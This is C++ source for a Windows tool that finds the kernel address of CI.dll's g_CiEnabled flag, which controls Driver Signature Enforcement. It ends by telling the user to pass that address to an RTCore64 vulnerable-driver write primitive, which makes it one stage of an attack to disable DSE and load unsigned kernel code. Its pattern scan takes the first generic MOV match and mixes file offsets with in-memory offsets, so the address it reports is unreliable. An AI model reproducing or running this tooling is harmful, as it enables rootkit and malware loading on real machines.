#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <stdio.h>

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "ntdll.lib")

// =============================================
// Structs
// =============================================
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE    Section;
    PVOID     MappedBase;
    PVOID     ImageBase;
    ULONG     ImageSize;
    ULONG     Flags;
    USHORT    LoadOrderIndex;
    USHORT    InitOrderIndex;
    USHORT    LoadCount;
    USHORT    OffsetToFileName;
    UCHAR     FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG                          NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;


PVOID GetCiKernelBase() {
    ULONG size = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &size);

    auto* list = (RTL_PROCESS_MODULES*)VirtualAlloc(
        nullptr, size * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!list) return nullptr;

    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)11, list, size * 2, &size);

    if (!NT_SUCCESS(status)) {
        VirtualFree(list, 0, MEM_RELEASE);
        return nullptr;
    }

    PVOID base = nullptr;
    for (ULONG i = 0; i < list->NumberOfModules; i++) {
        auto& mod = list->Modules[i];
        const char* name = (char*)mod.FullPathName + mod.OffsetToFileName;
        if (_stricmp(name, "CI.dll") == 0) {
            base = mod.ImageBase;
            printf("[STEP 1] CI.dll kernel base  = 0x%p\n", base);
            break;
        }
    }

    VirtualFree(list, 0, MEM_RELEASE);
    return base;
}


BYTE* LoadCiFromDisk(DWORD* outSize) {
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, L"\\CI.dll");

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open CI.dll: 0x%08X\n", GetLastError());
        return nullptr;
    }

    DWORD fileSize = GetFileSize(hFile, nullptr);
    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, fileSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead = 0;
    ReadFile(hFile, buf, fileSize, &bytesRead, nullptr);
    CloseHandle(hFile);

    printf("[STEP 2A] CI.dll read from disk  = %d bytes\n", fileSize);
    *outSize = fileSize;
    return buf;
}



struct Pattern {
    BYTE   bytes[2];
    const char* name;
};

const Pattern patterns[] = {
    { {0x89, 0x0D}, "MOV [rel], ecx" },
    { {0x89, 0x05}, "MOV [rel], eax" },
    { {0x89, 0x15}, "MOV [rel], edx" },
};

ULONG_PTR ScanForCiEnabledOffset(BYTE* buf, DWORD size) {
    for (auto& pat : patterns) {
        for (DWORD i = 0; i < size - 6; i++) {
            if (buf[i] == pat.bytes[0] &&
                buf[i + 1] == pat.bytes[1]) {

                INT32     rel = *(INT32*)(buf + i + 2);
                ULONG_PTR rip = (ULONG_PTR)buf + i + 6;
                ULONG_PTR target = rip + (LONG_PTR)rel;


                ULONG_PTR fileOffset = target - (ULONG_PTR)buf;


                if (fileOffset > 0 && fileOffset < size) {
                    printf("[STEP 2B] Pattern '%s' @ file+0x%X\n",
                        pat.name, i);
                    printf("[STEP 2C] g_CiEnabled offset = 0x%llX\n",
                        fileOffset);
                    return fileOffset;
                }
            }
        }
    }

    printf("[-] No valid pattern found\n");
    return 0;
}

PVOID CalcFinalAddress(PVOID kernelBase, ULONG_PTR offset) {
    PVOID addr = (PVOID)((ULONG_PTR)kernelBase + offset);
    printf("\n[STEP 3] Final Calculation:\n");
    printf("         Kernel base  +  Offset      =  Final Address\n");
    printf("         0x%p  +  0x%08llX  =  0x%p\n",
        kernelBase, offset, addr);
    return addr;
}

void PrintVerificationCommand(PVOID addr) {
    printf("\n[VERIFY] في WinDbg شغّل:\n");
    printf("         dd 0x%p L1\n", addr);
    printf("         القيمة المتوقعة: 6 (DSE ON) أو 0 (DSE OFF)\n");
}

// =============================================
// MAIN
// =============================================
int main() {
    printf("╔══════════════════════════════════════════╗\n");
    printf("║   g_CiEnabled Address Finder v2          ║\n");
    printf("║   Pattern Scan + Kernel Base              ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    // ── Step 1 ─────────────────────────────────
    PVOID ciKernelBase = GetCiKernelBase();
    if (!ciKernelBase) {
        printf("[-] STEP 1 FAILED - Run as Administrator\n");
        return 1;
    }

    // ── Step 2 ─────────────────────────────────
    DWORD ciSize = 0;
    BYTE* ciBuf = LoadCiFromDisk(&ciSize);
    if (!ciBuf) {
        printf("[-] STEP 2A FAILED\n");
        return 1;
    }

    ULONG_PTR offset = ScanForCiEnabledOffset(ciBuf, ciSize);
    VirtualFree(ciBuf, 0, MEM_RELEASE);

    if (!offset) {
        printf("[-] STEP 2B FAILED - Pattern not found\n");
        return 1;
    }

    // ── Step 3 ─────────────────────────────────
    PVOID gCiEnabled = CalcFinalAddress(ciKernelBase, offset);

    // ── Verification hint ──────────────────────
    PrintVerificationCommand(gCiEnabled);

    printf("\n[✓] g_CiEnabled = 0x%p\n", gCiEnabled);
    printf("[✓] Pass this address to RTCore64 write primitive\n");

    return 0;
}